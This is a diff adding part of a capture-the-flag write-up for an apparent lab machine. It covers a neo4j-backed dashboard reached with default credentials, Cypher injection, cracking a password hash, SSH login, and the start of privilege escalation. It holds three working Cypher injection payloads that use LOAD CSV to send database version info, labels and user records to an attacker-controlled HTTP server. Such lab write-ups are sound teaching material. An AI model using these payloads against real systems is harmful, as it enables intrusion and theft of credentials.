@@ -219,3 +219,70 @@ In the victim box:
 ![image](https://user-images.githubusercontent.com/87700008/234597676-01546cda-1a2b-43bb-b21f-a10f988d9293.png)
 ![image](https://user-images.githubusercontent.com/87700008/234597774-f0e7ef5c-bdce-465c-bf53-9b02a57ca2bc.png)
 
+After performing the port forwarding I loaded the service running on port 8001 & got a login page.
+
+![image](https://user-images.githubusercontent.com/87700008/234723074-604ea8a9-c6ff-44b4-8b22-38b169263aba.png)
+
+I tried different default credentials & finally found 'admin:admin' as a valid credentials.This is a website which is having multiple data hosted in it such as employee info, sales info, e-mails, etc.
+
+![image](https://user-images.githubusercontent.com/87700008/234723577-225b8da6-381c-4294-bbce-f2a22c933e93.png)
+
+As I observed earlier there is a neo4j database running in the background & in this case when I browsed through the port 7474 service I got the neo4j console page as well. Which clearly indicates that the dashboard is running on the neo4j database.
+
+![image](https://user-images.githubusercontent.com/87700008/234723987-b9ef1fb0-5bfa-41ef-903d-8e6096b407ad.png)
+
+#### Injection:
+
+Since neo4j is a database this might be vulnerable to the injection as well just like a SQL DB. I started searching for the neo4j injection & found the injection methods on hacktriz website, known as [cypher injection neo4j](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j).
+
+There is a search bar in the Employees section of the dashboard which probably looks vulnerable for the injection. I fired up the burp & intercepted the request to test it.
+
+![image](https://user-images.githubusercontent.com/87700008/234725758-333bde8e-757a-420f-93b5-eea9346de4b0.png)
+
+I started checking with the **server version info** & passed this payload in the search parameter in URL enocded format. Also, as I am passing the http requests I also started my HTTP server.
+```
+' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+```
+
+![image](https://user-images.githubusercontent.com/87700008/234725974-e73af889-e367-4c78-a0fe-b768e9dd6f91.png)
+![image](https://user-images.githubusercontent.com/87700008/234726008-fde79e2c-ec03-44d3-8322-32b299277c8e.png)
+
+Getting the label info to list all existing labels.
+```
+' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://IP:80/?label='+label as l RETURN 0 as _0 //
+```
+
+![image](https://user-images.githubusercontent.com/87700008/234726758-9e2d0adb-a45d-4b2c-a8ef-92b04e2c2f1e.png)
+
+Found 2 tables **user** & **employee**.
+
+Now Finally it's time to retriee info from the tables :
+```
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+![image](https://user-images.githubusercontent.com/87700008/234727096-5cee1c9c-bf30-4924-8dc0-03ae315c7441.png)
+
+In the response I got the admin & john, password hash. Now, let's cracl the password of John.
+
+In few seconds I cracked the password using John the Ripper.
+
+![image](https://user-images.githubusercontent.com/87700008/234728055-1ed4f9b5-be08-4e70-a03a-87d7b8092c94.png)
+
+And, finally I logged in into the John account via SSH using the cracked password & got the user flag. (pwn3d!🙂)
+
+![image](https://user-images.githubusercontent.com/87700008/234728218-8d3baefb-294d-494b-a994-22d27a46c887.png)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Privilege Escalation:
+
+After getting access of John's account I checked for the sudo privileges & found this :
+
+![image](https://user-images.githubusercontent.com/87700008/234729321-b7ae0af1-b0e6-4658-83e2-c584b00c30ac.png)
+
+
+I forwarded the traffic of the port 3000 to my attack machine & loaded it in the browser. It's a git server with just 1 test repository.
+
+![image](https://user-images.githubusercontent.com/87700008/234729484-f99d6703-cb8d-4efa-9003-29f7309e8024.png)
+
+
